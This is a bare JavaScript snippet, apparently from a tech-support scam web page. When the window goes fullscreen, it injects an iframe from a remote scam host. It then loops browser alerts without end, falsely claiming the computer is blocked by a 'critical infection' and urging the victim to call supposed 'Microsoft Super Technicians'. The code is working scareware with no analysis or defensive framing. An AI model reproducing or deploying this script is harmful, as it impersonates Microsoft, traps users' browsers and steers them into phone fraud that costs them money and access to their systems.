window.addEventListener('resize', function(){
  if(screen.width === window.innerWidth){
		document.getElementById('auth').innerHTML = "<iframe src='http://404error-zeus-detected.usa.cc/main/report.php'  ></iframe>";
		}
		
		setInterval(function () { alert("Your computer is in blocked state.\nSYSTEM WARNING :\nDO NOT PRESS ANY KEY UNTIL YOU KNOW SAFE SIDE INSTRUCTIONS.\n For saftey instructions immediately call on the support number , a Microsoft Super Technician is waiting to guide you to safeguard your system.\nYou must not avoid this warning , as this is a very critical infection.\nMicrosoft Super Technicians are level 9 technicians which are expertise in resolving these kind of issues.\nTHIS CALL IS A TOLL FREE CALL. ") }, 0000);
		
		
	
});
